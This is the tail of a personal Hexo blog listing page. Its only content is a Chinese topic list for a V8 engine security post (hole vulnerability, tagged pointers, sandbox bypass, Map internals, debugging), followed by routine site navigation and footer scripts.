<li><p>JS 对象内存信息布局</p>
</li>
<li><p>JavaScript Hole 漏洞</p>
</li>
<li><p>Tagged Pointer</p>
</li>
<li><p>JavaScript Sandbox 以及其绕过手法</p>
</li>
<li><p>Map 对象原理以及 OrderedHashMap </p>
</li>
<li><p>V8 的编译以及调试手法</p>
</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/9/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><span class="page-number current">10</span><a class="page-number" href="/page/11/">11</a><span class="space">&hellip;</span><a class="page-number" href="/page/30/">30</a><a class="extend next" rel="next" href="/page/11/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="yhellow"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">yhellow</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">292</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">13</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">152</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2019 – 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">yhellow</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="Symbols count total">4.1m</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">61:49</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

</body>
</html>
